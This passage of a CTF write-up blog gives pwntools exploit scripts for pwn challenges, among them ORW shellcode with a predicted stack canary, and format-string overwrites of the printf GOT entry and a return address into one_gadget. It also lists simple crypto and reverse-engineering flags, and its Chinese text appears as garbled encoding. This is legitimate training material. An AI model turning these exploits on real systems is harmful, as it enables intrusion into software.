class="built_in">range</span>(<span class="built_in">len</span>(shellcode)):</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">0x30</span> + i).encode())</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="built_in">hex</span>(shellcode[i])[<span class="number">2</span>:]).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line"></span><br><span class="line">    byte = return_addr &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">0x28</span> + i).encode())</span><br><span class="line">    sl(<span class="built_in">hex</span>(byte)[<span class="number">2</span>:])</span><br><span class="line">    </span><br><span class="line">    return_addr &gt;&gt;= <span class="number">8</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="white-canary"><a href="#white-canary" class="headerlink" title="white_canary"></a>white_canary</h2><p>vmmapå‘ç°bssæœ‰å¯æ‰§è¡Œçš„æƒé™ï¼Œç¬¬ä¸€æ¬¡read bufï¼Œå¾€ä¸€å—æœ‰å¯è¯»å¯å†™å¯æ‰§è¡Œçš„åœ°å€å†™æ•°æ®ï¼Œç¬¬äºŒæ¬¡getså¯ä»¥æº¢å‡ºï¼Œä½†æ˜¯seccompç¦ç”¨äº†execveç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åæœ‰ä¸ªcanaryï¼Œä½†canaryæ˜¯é€šè¿‡éšæœºæ•°ç”Ÿæˆå‡ºæ¥çš„</p>
<p>æ‰€ä»¥æ€è·¯æ˜¯å…ˆå¾€bufä¸­å†™orwçš„shellcodeï¼Œç„¶åæº¢å‡ºä¿®æ”¹è¿”å›åœ°å€æ‰§è¡Œè¿™ä¸ªshellcodeæŠŠflagè¯»å‡ºæ¥</p>
<p>open(flag,0,0)</p>
<p>read(fd,buf,size)</p>
<p>write(fd,buf,size)</p>
<p>ç”¨ctypesæ¨¡æ‹Ÿcanaryçš„ç”Ÿæˆï¼Œæº¢å‡ºçš„æ—¶å€™å¸¦ä¸Šcanaryå°±å¥½äº†ï¼Œgdbçœ‹äº†ä¸€ä¸‹ï¼Œæ˜¯å–ç”Ÿæˆçš„canaryçš„ç¬¬å…«å­—èŠ‚ï¼Œç„¶åå†™åˆ°fsæ®µåç§»0x28</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = seccomp_init(<span class="number">2147418112LL</span>, argv, envp);</span><br><span class="line">  seccomp_rule_add(v4, <span class="number">0LL</span>, <span class="number">59LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_load(v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You are lost in a forest of pwn,find the secret of this world&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You find a man,he said:If you want to get out of here, you need to tell me your name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me something:&quot;</span>);</span><br><span class="line">  gets(v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">time_t</span> seed; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  seed = time(<span class="number">0LL</span>) % <span class="number">60</span>;</span><br><span class="line">  srand(seed);</span><br><span class="line">  v2 = rand();</span><br><span class="line">  v3 = rand();</span><br><span class="line">  __writefsqword(</span><br><span class="line">    <span class="number">0x28</span>u,</span><br><span class="line">    (((v2 &gt;&gt; <span class="number">4</span>) ^ (<span class="number">16</span> * v3 + (v3 &gt;&gt; <span class="number">8</span>) * (v2 &lt;&lt; <span class="number">8</span>))) &gt;&gt; <span class="number">32</span>)</span><br><span class="line">  + ((((v2 &gt;&gt; <span class="number">48</span>) + (v2 &lt;&lt; <span class="number">16</span>) * (v3 &gt;&gt; <span class="number">16</span>)) ^ (v3 &lt;&lt; <span class="number">48</span>)) &lt;&lt; <span class="number">32</span>));</span><br><span class="line">  <span class="keyword">return</span> mprotect(&amp;GLOBAL_OFFSET_TABLE_, <span class="number">0x1000</span>uLL, <span class="number">7</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## srand</span></span><br><span class="line">libc = ctypes.CDLL(os.path.join(os.getcwd(), <span class="string">&#x27;libc.so.6&#x27;</span>))</span><br><span class="line">seed = libc.time(<span class="literal">None</span>) % <span class="number">60</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">    port = <span class="number">31936</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">v2 = libc.rand()</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">canary = (((v2 &gt;&gt; <span class="number">4</span>) ^ (<span class="number">16</span> * v3 + (v3 &gt;&gt; <span class="number">8</span>) * (v2 &lt;&lt; <span class="number">8</span>))) &gt;&gt; <span class="number">32</span>) + ((((v2 &gt;&gt; <span class="number">48</span>) + (v2 &lt;&lt; <span class="number">16</span>) * (v3 &gt;&gt; <span class="number">16</span>)) ^ (v3 &lt;&lt; <span class="number">48</span>)) &lt;&lt; <span class="number">32</span>)</span><br><span class="line">canary = canary &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">success(<span class="string">f&quot;Canary -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">orw_shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edx,0x67616c66</span></span><br><span class="line"><span class="string">push rdx   </span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor esi,esi                    </span></span><br><span class="line"><span class="string">mov eax,0x2  </span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">mov edi,eax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor edi,2</span></span><br><span class="line"><span class="string">mov eax,edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">sa(<span class="string">&quot;Please enter your name:\n&quot;</span>,orw_shellcode)</span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span> - <span class="number">0x8</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x00000000004040E0</span>)</span><br><span class="line">sla(<span class="string">b&quot;tell me something:\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="fmt1-0-è¡¥"><a href="#fmt1-0-è¡¥" class="headerlink" title="fmt1.0[è¡¥]"></a>fmt1.0[è¡¥]</h2><p>å’±æ˜¯ç¬¨è›‹ï¼Œè¿™ä¸ªprintfå¾ˆå¥‡æ€ªï¼Œæ²¡æœ‰æƒ³åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹printfçš„gotè¡¨ï¼Œä¸ºexecveï¼Œå’±ä»¥ä¸ºæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿ç»­å†™ï¼Œç„¶året2libcï¼Œåé¢çœ‹å…¶ä»–å¸ˆå‚…çš„wpåå‘ç°ï¼Œå¯ä»¥ä¿®æ”¹è¿™ä¸ªprintfçš„ gotè¡¨ä½execve</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char s[80]; // [rsp+0h] [rbp-50h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(s, 0, sizeof(s));</span><br><span class="line">  puts(&quot;Please enter your username: &quot;);</span><br><span class="line">  read(0, s, 0x60uLL);</span><br><span class="line">  printf(&quot;Hello,&quot;);</span><br><span class="line">  printf(s, 0LL);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-e&#x27;]</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./fmt1.0&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># is_debug = 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if(is_debug):</span></span><br><span class="line"><span class="comment">#     p = process()</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     ip = &quot;node4.buuoj.cn&quot;</span></span><br><span class="line"><span class="comment">#     port = 29349</span></span><br><span class="line"><span class="comment">#     p = remote(ip,port)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def exec_fmt(pad):</span></span><br><span class="line"><span class="comment">#     p = process(&quot;./fmt1.0&quot;)</span></span><br><span class="line">	</span><br><span class="line"><span class="comment">#     p.recvuntil(b&quot;Please enter your username: \n&quot;)</span></span><br><span class="line"><span class="comment">#     p.send(pad)</span></span><br><span class="line"><span class="comment">#     p.recvuntil(b&quot;Hello,&quot;)</span></span><br><span class="line"><span class="comment">#     return p.recv()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fmt = FmtStr(exec_fmt)</span></span><br><span class="line"><span class="comment"># success(f&quot;offset -&gt;&#123;str(fmt.offset)&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./fmt1.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line"><span class="comment"># payload = fmtstr_payload(6,&#123;0x7fffffffe220:0x1337babe&#125;)</span></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Please enter your username: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4012CA</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;elf.got[<span class="string">&quot;printf&quot;</span>]:elf.plt[<span class="string">&quot;execve&quot;</span>]&#125;)</span><br><span class="line">success(<span class="string">f&quot;payload -&gt;<span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(main)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="fmt2-0-è¡¥"><a href="#fmt2-0-è¡¥" class="headerlink" title="fmt2.0[è¡¥]"></a>fmt2.0[è¡¥]</h2><p>æœ‰ä¸¤æ¬¡printfæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç¬¬ä¸€æ¬¡æ³„éœ²ä¸€ä¸ªlibcç›¸å…³çš„åœ°å€å’Œæ ˆä¸Šçš„åœ°å€ç®—å‡ºlibc_baseå’Œè¿”å›åœ°å€ï¼Œç¬¬äºŒæ¬¡æŠŠè¿”å›åœ°å€ä¿®æ”¹æˆone_gadgetçš„åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[88]; // [rsp+0h] [rbp-60h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  printf(&quot;frist str:&quot;);</span><br><span class="line">  read(0, buf, 0x50uLL);</span><br><span class="line">  printf(buf);</span><br><span class="line">  putchar(10);</span><br><span class="line">  printf(&quot;second str:&quot;);</span><br><span class="line">  read(0, buf, 0x50uLL);</span><br><span class="line">  printf(buf);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./fmt2.0&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    port = <span class="number">29349</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&quot;aaaa%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">leek_addr = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">ret_addr = leek_addr + <span class="number">0x68</span></span><br><span class="line">success(<span class="string">f&quot;ret_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;0x50-&quot;</span>)</span><br><span class="line">read_addr = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">read_addr -= <span class="number">0x12</span></span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">success(<span class="string">f&quot;libc_base -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">one=<span class="number">0xe3b01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">6</span>,&#123;ret_addr:libc_base+one&#125;,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="fmt3-0-è¡¥"><a href="#fmt3-0-è¡¥" class="headerlink" title="fmt3.0[è¡¥]"></a>fmt3.0[è¡¥]</h2><h2 id="ez-fullprotection-è¡¥"><a href="#ez-fullprotection-è¡¥" class="headerlink" title="ez_fullprotection[è¡¥]"></a>ez_fullprotection[è¡¥]</h2><h2 id="mips-è¡¥"><a href="#mips-è¡¥" class="headerlink" title="mips[è¡¥]"></a>mips[è¡¥]</h2><h2 id="why-not-puts-è¡¥"><a href="#why-not-puts-è¡¥" class="headerlink" title="why_not_puts[è¡¥]"></a>why_not_puts[è¡¥]</h2><h2 id="eva-è¡¥"><a href="#eva-è¡¥" class="headerlink" title="eva[è¡¥]"></a>eva[è¡¥]</h2><h1 id="Cypto"><a href="#Cypto" class="headerlink" title="Cypto"></a>Cypto</h1><h2 id="easy-classic"><a href="#easy-classic" class="headerlink" title="easy_classic"></a>easy_classic</h2><p>æœ‰äº›ç»•</p>
<p>å‡¯æ’’-&gt;æ …æ -&gt;base64-&gt;ç†Šæ›°-&gt;key base100 emjoy-&gt;playfair</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;classical_1s_fun&#125;</span><br></pre></td></tr></table></figure>

<h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;Hello_World_Crypto_bibobibo&#125;</span><br></pre></td></tr></table></figure>



</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-28</span><span class="leancloud_visitors"></span><span>About 4747 words, 15 min 49 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/28/moectf-wp/">moectf_wp</a></h3></div><div class="post-content"><div class="card"><p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Reverseå…¥é—¨æŒ‡åŒ—"><a href="#Reverseå…¥é—¨æŒ‡åŒ—" class="headerlink" title="Reverseå…¥é—¨æŒ‡åŒ—"></a>Reverseå…¥é—¨æŒ‡åŒ—</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( *(_DWORD *)v7 == 13 )</span><br><span class="line">   sub_401082(aMoectfF1rstSt3, v6);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aMoectfF1rstSt3 db &#x27;moectf&#123;F1rst_St3p_1s_D0ne&#125;&#x27;,0Ah,0</span><br></pre></td></tr></table></figure>



<h2 id="base-64"><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h2><p>pycdc ä¸‹è½½ ç¼–è¯‘</p>
<p>å‘ç°æ˜¯base64å˜ç§</p>
<p><a target="_blank" rel="noopener" href="http://web.chacuo.net/netbasex">http://web.chacuo.net/netbasex</a></p>
